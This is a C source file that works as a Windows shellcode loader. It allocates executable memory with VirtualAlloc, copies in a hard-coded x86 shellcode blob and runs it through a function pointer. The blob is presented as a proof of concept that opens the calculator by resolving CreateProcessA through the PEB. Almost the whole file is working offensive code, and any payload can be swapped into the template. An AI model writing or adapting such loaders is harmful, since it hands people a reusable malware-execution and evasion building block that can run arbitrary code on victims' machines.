// Loading shellcode using windows API's (virtualAlloc, memcpy)
#include <windows.h>

int main()
{
	//shellcode that pops open the windows calculator as proof of concept
	const char* shellcode_opencalc = \
        "\x31\xc9\xf7\xe1\x64\x8b\x41"
        "\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
        "\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
        "\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
        "\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
        "\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
        "\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
        "\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
        "\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
        "\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
        "\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
        "\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
        "\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
        "\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
        "\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
        "\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
        "\xc9\x51\xff\xd0";

    //get the size_t of our shellcode
    size_t allocSize = strlen(shellcode_opencalc);

    //allocate a buffer in memory, the size-t of our shellcode
	LPVOID memory_buffer = VirtualAlloc(0, allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    //copy it over
	memcpy(memory_buffer, shellcode_opencalc, allocSize);

    //execute our memory buffer which has the shellcode allocated to it -> this will pop open the calculator
	((void(*)())memory_buffer)();
}